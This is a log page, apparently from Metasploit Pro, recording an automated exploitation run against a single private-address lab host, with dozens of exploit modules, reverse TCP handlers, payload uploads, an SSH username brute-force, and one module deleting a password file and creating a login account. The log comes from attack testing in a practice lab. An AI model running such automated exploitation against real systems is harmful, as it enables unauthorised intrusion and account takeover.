

    Account - kbigler ▼
    Administration ▼
    ?
    12

    Project - lab5 ▼

    Overview
    Analysis
    Sessions
    Campaigns
    Web Apps
    Modules
    Credentials
    Reports
    Exports
    Tasks 1

Collect...
Homelab5 Tasks Task 12
Exploiting
	
Complete (0 sessions opened, 1 host targeted, 0 hosts skipped)
	Completed 	Started: 2016-06-04 09:38:27 -0700
Duration: 37 minutes

  
[*] [2016.06.04-09:38:27] Minimum rank: great, transport evasion level: 0, application evasion level: 0
[*] [2016.06.04-09:38:27] Target hosts: 10.198.0.1
[+] [2016.06.04-09:38:27] Workspace:lab5 Progress:1/100 (1%) Starting analysis
[+] [2016.06.04-09:38:27] Workspace:lab5 Progress:2/100 (2%) Analyzing exploits: filtering by vulnerability, port
[+] [2016.06.04-09:38:34] Workspace:lab5 Progress:3/100 (3%) Building exploit map: matching by vulnerability, port
[*] [2016.06.04-09:38:34] Matching exploits: 0 hosts processed (0 potential actions)
[+] [2016.06.04-09:38:35] Workspace:lab5 Progress:4/100 (4%) Building attack plan
[*] [2016.06.04-09:38:35] Finalizing attack plan: 770 total exploits
[+] [2016.06.04-09:38:35] Workspace:lab5 Progress:5/775 (0%) [1/770] 10.198.0.1:111 - Solaris ypupdated Command Execution
[+] [2016.06.04-09:38:35] Workspace:lab5 Progress:6/775 (0%) [2/770] 10.198.0.1:8080 - Google Appliance ProxyStyleSheet Command Execution
[+] [2016.06.04-09:38:36] Workspace:lab5 Progress:7/775 (0%) [3/770] 10.198.0.1:111 - Solaris sadmind Command Execution
[+] [2016.06.04-09:38:37] Workspace:lab5 Progress:8/775 (1%) [4/770] 10.198.0.1:8080 - Watchguard XCS Remote Command Execution
[-] [2016.06.04-09:38:37] No reverse connect payloads available for exploit/solaris/sunrpc/ypupdated_exec
[-] [2016.06.04-09:38:37] No payloads were compatible with exploit/solaris/sunrpc/ypupdated_exec)
[-] [2016.06.04-09:38:37] No reverse connect payloads available for exploit/unix/webapp/google_proxystylesheet_exec
[-] [2016.06.04-09:38:37] No payloads were compatible with exploit/unix/webapp/google_proxystylesheet_exec)
[-] [2016.06.04-09:38:37] [0001] 10.198.0.1:111 - Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:37] [0002] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:37] No reverse connect payloads available for exploit/solaris/sunrpc/sadmind_exec
[-] [2016.06.04-09:38:37] No payloads were compatible with exploit/solaris/sunrpc/sadmind_exec)
[-] [2016.06.04-09:38:37] No reverse connect payloads available for exploit/freebsd/http/watchguard_cmd_exec
[-] [2016.06.04-09:38:37] No payloads were compatible with exploit/freebsd/http/watchguard_cmd_exec)
[-] [2016.06.04-09:38:37] [0003] 10.198.0.1:111 - Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:37] [0004] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:38] Workspace:lab5 Progress:9/775 (1%) [5/770] 10.198.0.1:8080 - eScan Web Management Console Command Injection
[+] [2016.06.04-09:38:38] Workspace:lab5 Progress:10/775 (1%) [6/770] 10.198.0.1:8080 - Matt Wright guestbook.pl Arbitrary Command Execution
[+] [2016.06.04-09:38:39] Workspace:lab5 Progress:11/775 (1%) [7/770] 10.198.0.1:22 - Apple iOS Default SSH Password Vulnerability
[-] [2016.06.04-09:38:39] No reverse connect payloads available for exploit/unix/webapp/guestbook_ssi_exec
[-] [2016.06.04-09:38:39] No payloads were compatible with exploit/unix/webapp/guestbook_ssi_exec)
[-] [2016.06.04-09:38:39] [0006] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:39] No reverse connect payloads available for exploit/apple_ios/ssh/cydia_default_ssh
[-] [2016.06.04-09:38:39] No payloads were compatible with exploit/apple_ios/ssh/cydia_default_ssh)
[-] [2016.06.04-09:38:39] [0007] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:39] Workspace:lab5 Progress:12/775 (1%) [8/770] 10.198.0.1:8080 - Dogfood CRM spell.php Remote Command Execution
[-] [2016.06.04-09:38:39] No reverse connect payloads available for exploit/unix/webapp/dogfood_spell_exec
[-] [2016.06.04-09:38:39] No payloads were compatible with exploit/unix/webapp/dogfood_spell_exec)
[-] [2016.06.04-09:38:39] [0008] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:39] Workspace:lab5 Progress:13/775 (1%) [9/770] 10.198.0.1:23 - Solaris in.telnetd TTYPROMPT Buffer Overflow
[-] [2016.06.04-09:38:39] No reverse connect payloads available for exploit/solaris/telnet/ttyprompt
[-] [2016.06.04-09:38:39] No payloads were compatible with exploit/solaris/telnet/ttyprompt)
[-] [2016.06.04-09:38:39] [0009] 10.198.0.1:23 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:40] Workspace:lab5 Progress:14/775 (1%) [10/770] 10.198.0.1:111 - Sun Solaris sadmind adm_build_path() Buffer Overflow
[-] [2016.06.04-09:38:40] No reverse connect payloads available for exploit/solaris/sunrpc/sadmind_adm_build_path
[-] [2016.06.04-09:38:40] No payloads were compatible with exploit/solaris/sunrpc/sadmind_adm_build_path)
[-] [2016.06.04-09:38:40] [0010] 10.198.0.1:111 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:40] Workspace:lab5 Progress:15/775 (1%) [11/770] 10.198.0.1:8080 - Oracle Database Client System Analyzer Arbitrary File Upload
[*] [2016.06.04-09:38:40] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:38:41] Workspace:lab5 Progress:16/775 (2%) [12/770] 10.198.0.1:111 - ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow (AIX)
[+] [2016.06.04-09:38:41] Workspace:lab5 Progress:17/775 (2%) [13/770] 10.198.0.1:80 - Google Appliance ProxyStyleSheet Command Execution
[-] [2016.06.04-09:38:41] No reverse connect payloads available for exploit/aix/rpc_ttdbserverd_realpath
[-] [2016.06.04-09:38:41] No payloads were compatible with exploit/aix/rpc_ttdbserverd_realpath)
[-] [2016.06.04-09:38:41] [0012] 10.198.0.1:111 - Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:41] No reverse connect payloads available for exploit/unix/webapp/google_proxystylesheet_exec
[-] [2016.06.04-09:38:41] No payloads were compatible with exploit/unix/webapp/google_proxystylesheet_exec)
[-] [2016.06.04-09:38:41] [0013] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:41] Workspace:lab5 Progress:18/775 (2%) [14/770] 10.198.0.1:23 - Sun Solaris Telnet Remote Authentication Bypass Vulnerability
[-] [2016.06.04-09:38:41] No reverse connect payloads available for exploit/solaris/telnet/fuser
[-] [2016.06.04-09:38:41] No payloads were compatible with exploit/solaris/telnet/fuser)
[-] [2016.06.04-09:38:41] [0014] 10.198.0.1:23 - Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:41] [0011] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:Oracle Containers for J2EE)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:38:42] Workspace:lab5 Progress:19/775 (2%) [15/770] 10.198.0.1:23 - Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow
[*] [2016.06.04-09:38:42] [0015] Started reverse TCP handler on 0.0.0.0:1030
[*] [2016.06.04-09:38:42] [0015] 10.198.0.1:23 - Brute forcing with 1 possible targets
[*] [2016.06.04-09:38:42] [0015] 10.198.0.1:23 - Trying target Red Hat Enterprise Linux 3 (krb5-telnet)...
[*] [2016.06.04-09:38:42] [0015] 10.198.0.1:23 - Debian GNU/Linux 8\x0avulny-1464829628773-512mb-sfo1-01 login:
[+] [2016.06.04-09:38:42] Workspace:lab5 Progress:20/775 (2%) [16/770] 10.198.0.1:22 - Ceragon FibeAir IP-10 SSH Private Key Exposure
[-] [2016.06.04-09:38:42] No reverse connect payloads available for exploit/linux/ssh/ceragon_fibeair_known_privkey
[-] [2016.06.04-09:38:42] No payloads were compatible with exploit/linux/ssh/ceragon_fibeair_known_privkey)
[-] [2016.06.04-09:38:43] [0016] 10.198.0.1:22 SSH - Failed authentication
[+] [2016.06.04-09:38:43] Workspace:lab5 Progress:21/775 (2%) [17/770] 10.198.0.1:8080 - ATutor 2.2.1 Directory Traversal / Remote Code Execution
[*] [2016.06.04-09:38:43] [0017] Started reverse TCP handler on 0.0.0.0:1031
[-] [2016.06.04-09:38:43] [0017] 10.198.0.1:8080 - Exploit failed: NoMethodError undefined method `empty?' for nil:NilClass
[+] [2016.06.04-09:38:43] Workspace:lab5 Progress:22/775 (2%) [18/770] 10.198.0.1:111 - AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
[-] [2016.06.04-09:38:43] No reverse connect payloads available for exploit/aix/rpc_cmsd_opcode21
[-] [2016.06.04-09:38:43] No payloads were compatible with exploit/aix/rpc_cmsd_opcode21)
[-] [2016.06.04-09:38:43] [0018] 10.198.0.1:111 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:43] Workspace:lab5 Progress:23/775 (2%) [19/770] 10.198.0.1:80 - Watchguard XCS Remote Command Execution
[-] [2016.06.04-09:38:43] No reverse connect payloads available for exploit/freebsd/http/watchguard_cmd_exec
[-] [2016.06.04-09:38:43] No payloads were compatible with exploit/freebsd/http/watchguard_cmd_exec)
[-] [2016.06.04-09:38:44] [0019] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:44] Workspace:lab5 Progress:24/775 (3%) [20/770] 10.198.0.1:80 - eScan Web Management Console Command Injection
[+] [2016.06.04-09:38:44] Workspace:lab5 Progress:25/775 (3%) [21/770] 10.198.0.1:22 - ExaGrid Known SSH Key and Default Password
[-] [2016.06.04-09:38:44] No reverse connect payloads available for exploit/linux/ssh/exagrid_known_privkey
[-] [2016.06.04-09:38:44] No payloads were compatible with exploit/linux/ssh/exagrid_known_privkey)
[+] [2016.06.04-09:38:45] Workspace:lab5 Progress:26/775 (3%) [22/770] 10.198.0.1:80 - Werkzeug Debug Shell Command Execution
[-] [2016.06.04-09:38:45] No reverse connect payloads available for exploit/multi/http/werkzeug_debug_rce
[-] [2016.06.04-09:38:45] No payloads were compatible with exploit/multi/http/werkzeug_debug_rce)
[-] [2016.06.04-09:38:45] [0022] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:45] Workspace:lab5 Progress:27/775 (3%) [23/770] 10.198.0.1:22 - F5 BIG-IP SSH Private Key Exposure
[-] [2016.06.04-09:38:45] No reverse connect payloads available for exploit/linux/ssh/f5_bigip_known_privkey
[-] [2016.06.04-09:38:45] No payloads were compatible with exploit/linux/ssh/f5_bigip_known_privkey)
[-] [2016.06.04-09:38:45] [0023] 10.198.0.1:22 SSH - Failed authentication
[+] [2016.06.04-09:38:45] Workspace:lab5 Progress:28/775 (3%) [24/770] 10.198.0.1:80 - Matt Wright guestbook.pl Arbitrary Command Execution
[-] [2016.06.04-09:38:45] No reverse connect payloads available for exploit/unix/webapp/guestbook_ssi_exec
[-] [2016.06.04-09:38:45] No payloads were compatible with exploit/unix/webapp/guestbook_ssi_exec)
[-] [2016.06.04-09:38:45] [0024] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:46] Workspace:lab5 Progress:29/775 (3%) [25/770] 10.198.0.1:80 - HP Openview connectedNodes.ovpl Remote Command Execution
[-] [2016.06.04-09:38:46] No reverse connect payloads available for exploit/unix/webapp/openview_connectednodes_exec
[-] [2016.06.04-09:38:46] No payloads were compatible with exploit/unix/webapp/openview_connectednodes_exec)
[-] [2016.06.04-09:38:46] [0025] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:46] Workspace:lab5 Progress:30/775 (3%) [26/770] 10.198.0.1:80 - ATutor 2.2.1 Directory Traversal / Remote Code Execution
[*] [2016.06.04-09:38:46] [0026] Started reverse TCP handler on 0.0.0.0:1035
[-] [2016.06.04-09:38:46] [0026] 10.198.0.1:80 - Exploit failed: NoMethodError undefined method `empty?' for nil:NilClass
[+] [2016.06.04-09:38:47] Workspace:lab5 Progress:31/775 (4%) [27/770] 10.198.0.1:8080 - Coppermine Photo Gallery picEditor.php Command Execution
[-] [2016.06.04-09:38:47] No reverse connect payloads available for exploit/unix/webapp/coppermine_piceditor
[-] [2016.06.04-09:38:47] No payloads were compatible with exploit/unix/webapp/coppermine_piceditor)
[-] [2016.06.04-09:38:47] [0027] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:47] Workspace:lab5 Progress:32/775 (4%) [28/770] 10.198.0.1:8080 - DD-WRT HTTP Daemon Arbitrary Command Execution
[-] [2016.06.04-09:38:47] No reverse connect payloads available for exploit/linux/http/ddwrt_cgibin_exec
[-] [2016.06.04-09:38:47] No payloads were compatible with exploit/linux/http/ddwrt_cgibin_exec)
[-] [2016.06.04-09:38:47] [0028] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:47] [0015] 10.198.0.1:23 - Exploit aborted due to failure: unknown: This system does not support encryption
[-] [2016.06.04-09:38:47] [0021] 10.198.0.1:22 SSH - Failed authentication
[+] [2016.06.04-09:38:47] Workspace:lab5 Progress:33/775 (4%) [29/770] 10.198.0.1:23 - FreeBSD Telnet Service Encryption Key ID Buffer Overflow
[-] [2016.06.04-09:38:47] No reverse connect payloads available for exploit/freebsd/telnet/telnet_encrypt_keyid
[-] [2016.06.04-09:38:47] No payloads were compatible with exploit/freebsd/telnet/telnet_encrypt_keyid)
[-] [2016.06.04-09:38:48] [0029] 10.198.0.1:23 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:48] Workspace:lab5 Progress:34/775 (4%) [30/770] 10.198.0.1:22 - Loadbalancer.org Enterprise VA SSH Private Key Exposure
[-] [2016.06.04-09:38:48] No reverse connect payloads available for exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey
[-] [2016.06.04-09:38:48] No payloads were compatible with exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey)
[+] [2016.06.04-09:38:48] Workspace:lab5 Progress:35/775 (4%) [31/770] 10.198.0.1:8080 - Microsoft SQL Server Payload Execution via SQL Injection
[*] [2016.06.04-09:38:48] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:38:48] [0030] 10.198.0.1:22 SSH - Failed authentication
[+] [2016.06.04-09:38:49] Workspace:lab5 Progress:36/775 (4%) [32/770] 10.198.0.1:80 - Zemra Botnet CnC Web Panel Remote Code Execution
[-] [2016.06.04-09:38:49] No reverse connect payloads available for exploit/multi/http/zemra_panel_rce
[-] [2016.06.04-09:38:49] No payloads were compatible with exploit/multi/http/zemra_panel_rce)
[-] [2016.06.04-09:38:49] [0032] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:38:49] [0031] Started reverse TCP handler on 0.0.0.0:1036
[+] [2016.06.04-09:38:49] Workspace:lab5 Progress:37/775 (4%) [33/770] 10.198.0.1:80 - PAJAX Remote Command Execution
[+] [2016.06.04-09:38:50] Workspace:lab5 Progress:38/775 (4%) [34/770] 10.198.0.1:22 - Quantum DXi V1000 SSH Private Key Exposure
[-] [2016.06.04-09:38:51] No reverse connect payloads available for exploit/linux/ssh/quantum_dxi_known_privkey
[-] [2016.06.04-09:38:51] No payloads were compatible with exploit/linux/ssh/quantum_dxi_known_privkey)
[*] [2016.06.04-09:38:51] [0033] Started reverse TCP handler on 0.0.0.0:1037
[*] [2016.06.04-09:38:51] [0031] Warning: This module will leave LBoHoLwx.exe in the SQL Server %TEMP% directory
[*] [2016.06.04-09:38:51] [0031] Writing the debug.com loader to the disk...
[-] [2016.06.04-09:38:51] [0031] Exploit aborted due to failure: no-target: The SQL injection parameter was not specified in the GET path
[*] [2016.06.04-09:38:51] [0033] 10.198.0.1:80 - The server returned: 302 Found
[+] [2016.06.04-09:38:51] Workspace:lab5 Progress:39/775 (5%) [35/770] 10.198.0.1:22 - Quantum vmPRO Backdoor Command
[-] [2016.06.04-09:38:51] No reverse connect payloads available for exploit/linux/ssh/quantum_vmpro_backdoor
[-] [2016.06.04-09:38:51] No payloads were compatible with exploit/linux/ssh/quantum_vmpro_backdoor)
[-] [2016.06.04-09:38:51] [0035] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:51] [0034] 10.198.0.1:22 SSH - Failed authentication
[+] [2016.06.04-09:38:51] Workspace:lab5 Progress:40/775 (5%) [36/770] 10.198.0.1:22 - Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
[-] [2016.06.04-09:38:51] No reverse connect payloads available for exploit/linux/ssh/symantec_smg_ssh
[-] [2016.06.04-09:38:51] No payloads were compatible with exploit/linux/ssh/symantec_smg_ssh)
[-] [2016.06.04-09:38:51] [0036] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:52] Workspace:lab5 Progress:41/775 (5%) [37/770] 10.198.0.1:8080 - MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
[*] [2016.06.04-09:38:52] [0037] Started reverse TCP handler on 0.0.0.0:1038
[*] [2016.06.04-09:38:52] [0037] Attempting automatic target detection...
[*] [2016.06.04-09:38:52] [0037] select @@version
[-] [2016.06.04-09:38:52] [0037] Exploit aborted due to failure: no-target: The SQL injection parameter was not specified in the GET path
[+] [2016.06.04-09:38:52] Workspace:lab5 Progress:42/775 (5%) [38/770] 10.198.0.1:22 - Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
[-] [2016.06.04-09:38:52] No reverse connect payloads available for exploit/unix/ssh/array_vxag_vapv_privkey_privesc
[-] [2016.06.04-09:38:52] No payloads were compatible with exploit/unix/ssh/array_vxag_vapv_privkey_privesc)
[-] [2016.06.04-09:38:52] [0038] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:53] Workspace:lab5 Progress:43/775 (5%) [39/770] 10.198.0.1:22 - Tectia SSH USERAUTH Change Request Password Reset Vulnerability
[-] [2016.06.04-09:38:53] No reverse connect payloads available for exploit/unix/ssh/tectia_passwd_changereq
[-] [2016.06.04-09:38:53] No payloads were compatible with exploit/unix/ssh/tectia_passwd_changereq)
[-] [2016.06.04-09:38:53] [0039] 10.198.0.1:22 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:53] Workspace:lab5 Progress:44/775 (5%) [40/770] 10.198.0.1:8080 - MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution
[*] [2016.06.04-09:38:53] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:38:53] [0040] Started reverse TCP handler on 0.0.0.0:1039
[+] [2016.06.04-09:38:54] Workspace:lab5 Progress:45/775 (5%) [41/770] 10.198.0.1:80 - Microsoft SQL Server Payload Execution via SQL Injection
[+] [2016.06.04-09:38:54] Workspace:lab5 Progress:46/775 (5%) [42/770] 10.198.0.1:22 - Freesshd Authentication Bypass
[*] [2016.06.04-09:38:54] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:38:55] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:38:55] [0040] Sending HTTP ConvertFile Request to upload the exe payload GQqjrfSIYleDe.exe
[*] [2016.06.04-09:38:55] [0042] Started reverse TCP handler on 0.0.0.0:1040
[+] [2016.06.04-09:38:55] Workspace:lab5 Progress:47/775 (6%) [43/770] 10.198.0.1:80 - vBulletin misc.php Template Name Arbitrary Code Execution
[-] [2016.06.04-09:38:55] No reverse connect payloads available for exploit/unix/webapp/php_vbulletin_template
[-] [2016.06.04-09:38:55] No payloads were compatible with exploit/unix/webapp/php_vbulletin_template)
[-] [2016.06.04-09:38:55] [0043] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:38:55] [0040] Failed to upload GQqjrfSIYleDe.exe
[*] [2016.06.04-09:38:55] [0041] Started reverse TCP handler on 0.0.0.0:1041
[+] [2016.06.04-09:38:56] Workspace:lab5 Progress:48/775 (6%) [44/770] 10.198.0.1:80 - PHP XML-RPC Arbitrary Code Execution
[*] [2016.06.04-09:38:56] [0042] 10.198.0.1:22 - Trying username '4Dgifts'
[*] [2016.06.04-09:38:57] [0041] Warning: This module will leave HUKmFEQQ.exe in the SQL Server %TEMP% directory
[*] [2016.06.04-09:38:57] [0041] Writing the debug.com loader to the disk...
[+] [2016.06.04-09:38:57] Workspace:lab5 Progress:49/775 (6%) [45/770] 10.198.0.1:8080 - ClipBucket Remote Code Execution
[-] [2016.06.04-09:38:57] [0041] Exploit aborted due to failure: no-target: The SQL injection parameter was not specified in the GET path
[-] [2016.06.04-09:38:57] No reverse connect payloads available for exploit/unix/webapp/php_xmlrpc_eval
[-] [2016.06.04-09:38:57] No payloads were compatible with exploit/unix/webapp/php_xmlrpc_eval)
[-] [2016.06.04-09:38:57] [0044] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:38:57] [0045] Started reverse TCP handler on 0.0.0.0:1042
[*] [2016.06.04-09:38:57] [0045] Uploading payload [ X2mg9RpSdV.php ]
[-] [2016.06.04-09:38:57] [0045] Exploit aborted due to failure: none: 10.198.0.1:8080 - File wasn't uploaded, aborting!
[+] [2016.06.04-09:38:57] Workspace:lab5 Progress:50/775 (6%) [46/770] 10.198.0.1:8080 - Novell ZENworks Configuration Management Remote Execution
[*] [2016.06.04-09:38:57] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:38:57] [0046] Started reverse TCP handler on 0.0.0.0:1043
[*] [2016.06.04-09:38:57] [0046] Uploading 6089 bytes as xJrsh4PkSeZFWdDAWQDdGAO2JhiAeS.war ...
[+] [2016.06.04-09:38:58] Workspace:lab5 Progress:51/775 (6%) [47/770] 10.198.0.1:80 - phpBB viewtopic.php Arbitrary Code Execution
[-] [2016.06.04-09:38:58] No reverse connect payloads available for exploit/unix/webapp/phpbb_highlight
[-] [2016.06.04-09:38:58] No payloads were compatible with exploit/unix/webapp/phpbb_highlight)
[-] [2016.06.04-09:38:58] [0047] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:58] Workspace:lab5 Progress:52/775 (6%) [48/770] 10.198.0.1:80 - ProjectSend Arbitrary File Upload
[*] [2016.06.04-09:38:58] [0048] Started reverse TCP handler on 0.0.0.0:1044
[*] [2016.06.04-09:38:58] [0048] Uploading file '9oLhtY8gzxdls.php' (1294 bytes)
[*] [2016.06.04-09:38:58] [0048] Received response: 302 -
[-] [2016.06.04-09:38:58] [0048] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Something went wrong
[+] [2016.06.04-09:38:58] Workspace:lab5 Progress:53/775 (6%) [49/770] 10.198.0.1:80 - QuickTime Streaming Server parse_xml.cgi Remote Execution
[-] [2016.06.04-09:38:58] No reverse connect payloads available for exploit/unix/webapp/qtss_parse_xml_exec
[-] [2016.06.04-09:38:58] No payloads were compatible with exploit/unix/webapp/qtss_parse_xml_exec)
[-] [2016.06.04-09:38:58] [0049] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:59] Workspace:lab5 Progress:54/775 (6%) [50/770] 10.198.0.1:80 - SolarWinds Storage Manager Authentication Bypass
[-] [2016.06.04-09:38:59] No reverse connect payloads available for exploit/multi/http/solarwinds_store_manager_auth_filter
[-] [2016.06.04-09:38:59] No payloads were compatible with exploit/multi/http/solarwinds_store_manager_auth_filter)
[-] [2016.06.04-09:38:59] [0050] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:38:59] Workspace:lab5 Progress:55/775 (7%) [51/770] 10.198.0.1:80 - Coppermine Photo Gallery picEditor.php Command Execution
[-] [2016.06.04-09:38:59] No reverse connect payloads available for exploit/unix/webapp/coppermine_piceditor
[-] [2016.06.04-09:38:59] No payloads were compatible with exploit/unix/webapp/coppermine_piceditor)
[-] [2016.06.04-09:38:59] [0051] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:00] Workspace:lab5 Progress:56/775 (7%) [52/770] 10.198.0.1:80 - XAMPP WebDAV PHP Upload
[*] [2016.06.04-09:39:00] [0052] Started reverse TCP handler on 0.0.0.0:1045
[*] [2016.06.04-09:39:00] [0052] Uploading Payload to /webdav/vgZ8F2K.php
[-] [2016.06.04-09:39:00] [0052] Failed to upload file!
[+] [2016.06.04-09:39:00] Workspace:lab5 Progress:57/775 (7%) [53/770] 10.198.0.1:80 - ClipBucket Remote Code Execution
[*] [2016.06.04-09:39:00] [0053] Started reverse TCP handler on 0.0.0.0:1046
[*] [2016.06.04-09:39:00] [0053] Uploading payload [ QuDYFZrbRI.php ]
[-] [2016.06.04-09:39:01] [0053] Exploit aborted due to failure: none: 10.198.0.1:80 - File wasn't uploaded, aborting!
[+] [2016.06.04-09:39:01] Workspace:lab5 Progress:58/775 (7%) [54/770] 10.198.0.1:8080 - Citrix Access Gateway Command Execution
[-] [2016.06.04-09:39:01] No reverse connect payloads available for exploit/unix/webapp/citrix_access_gateway_exec
[-] [2016.06.04-09:39:01] No payloads were compatible with exploit/unix/webapp/citrix_access_gateway_exec)
[-] [2016.06.04-09:39:01] [0054] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:01] Workspace:lab5 Progress:59/775 (7%) [55/770] 10.198.0.1:80 - Simple Backdoor Shell Remote Code Execution
[-] [2016.06.04-09:39:01] No reverse connect payloads available for exploit/multi/http/simple_backdoors_exec
[-] [2016.06.04-09:39:01] No payloads were compatible with exploit/multi/http/simple_backdoors_exec)
[-] [2016.06.04-09:39:01] [0055] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:02] Workspace:lab5 Progress:60/775 (7%) [56/770] 10.198.0.1:8080 - InstantCMS 1.6 Remote PHP Code Execution
[*] [2016.06.04-09:39:02] [0056] Started reverse TCP handler on 0.0.0.0:1047
[*] [2016.06.04-09:39:02] [0056] Executing payload...
[+] [2016.06.04-09:39:03] Workspace:lab5 Progress:61/775 (7%) [57/770] 10.198.0.1:80 - LifeSize UVC Authenticated RCE via Ping
[-] [2016.06.04-09:39:03] No reverse connect payloads available for exploit/linux/http/lifesize_uvc_ping_rce
[-] [2016.06.04-09:39:03] No payloads were compatible with exploit/linux/http/lifesize_uvc_ping_rce)
[-] [2016.06.04-09:39:03] [0057] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:03] Workspace:lab5 Progress:62/775 (8%) [58/770] 10.198.0.1:80 - InstantCMS 1.6 Remote PHP Code Execution
[*] [2016.06.04-09:39:03] [0058] Started reverse TCP handler on 0.0.0.0:1048
[*] [2016.06.04-09:39:03] [0058] Executing payload...
[+] [2016.06.04-09:39:05] Workspace:lab5 Progress:63/775 (8%) [59/770] 10.198.0.1:8080 - CakePHP Cache Corruption Code Execution
[*] [2016.06.04-09:39:05] [0059] Started reverse TCP handler on 0.0.0.0:1049
[*] [2016.06.04-09:39:05] [0059] Sending exploit request 1
[*] [2016.06.04-09:39:05] [0059] Sending exploit request 2
[*] [2016.06.04-09:39:06] [0059] Requesting our payload
[+] [2016.06.04-09:39:06] Workspace:lab5 Progress:64/775 (8%) [60/770] 10.198.0.1:8080 - XAMPP WebDAV PHP Upload
[*] [2016.06.04-09:39:06] [0060] Started reverse TCP handler on 0.0.0.0:1050
[*] [2016.06.04-09:39:06] [0060] Uploading Payload to /webdav/25rYhvC.php
[-] [2016.06.04-09:39:06] [0060] Failed to upload file!
[+] [2016.06.04-09:39:08] Workspace:lab5 Progress:65/775 (8%) [61/770] 10.198.0.1:8080 - Cacti graph_view.php Remote Command Execution
[-] [2016.06.04-09:39:08] No reverse connect payloads available for exploit/unix/webapp/cacti_graphimage_exec
[-] [2016.06.04-09:39:08] No payloads were compatible with exploit/unix/webapp/cacti_graphimage_exec)
[-] [2016.06.04-09:39:08] [0061] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:09] Workspace:lab5 Progress:66/775 (8%) [62/770] 10.198.0.1:80 - Simple E-Document Arbitrary File Upload
[*] [2016.06.04-09:39:09] [0062] Started reverse TCP handler on 0.0.0.0:1051
[*] [2016.06.04-09:39:09] [0062] Uploading PHP payload...
[+] [2016.06.04-09:39:09] Workspace:lab5 Progress:67/775 (8%) [63/770] 10.198.0.1:80 - Ruby on Rails Known Secret Session Cookie Remote Code Execution
[-] [2016.06.04-09:39:09] [0062] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to write 6sGehShE2G.php
[-] [2016.06.04-09:39:09] No reverse connect payloads available for exploit/multi/http/rails_secret_deserialization
[-] [2016.06.04-09:39:09] No payloads were compatible with exploit/multi/http/rails_secret_deserialization)
[+] [2016.06.04-09:39:10] Workspace:lab5 Progress:68/775 (8%) [64/770] 10.198.0.1:80 - Simple PHP Blog Remote Command Execution
[*] [2016.06.04-09:39:10] [0064] Started reverse TCP handler on 0.0.0.0:1052
[*] [2016.06.04-09:39:10] [0064] Successfully retrieved hash:
[+] [2016.06.04-09:39:10] Workspace:lab5 Progress:69/775 (8%) [65/770] 10.198.0.1:80 - Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload
[*] [2016.06.04-09:39:10] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:39:10] [0064] Successfully removed /config/password.txt
[*] [2016.06.04-09:39:10] [0065] Started reverse TCP handler on 0.0.0.0:1053
[*] [2016.06.04-09:39:11] [0042] 10.198.0.1:22 - Trying username 'EZsetup'
[*] [2016.06.04-09:39:11] [0064] Successfully created temporary account.
[*] [2016.06.04-09:39:11] [0065] 10.198.0.1:80 - Stager name is: fejCs.jsp
[*] [2016.06.04-09:39:11] [0065] 10.198.0.1:80 - Executable name is: ktJSQ.exe
[*] [2016.06.04-09:39:11] [0065] 10.198.0.1:80 - Uploading stager...
[*] [2016.06.04-09:39:11] [0064] Successfully logged in as NwXEKQ:Fuld4H
[-] [2016.06.04-09:39:11] [0064] Error retrieving cookie!
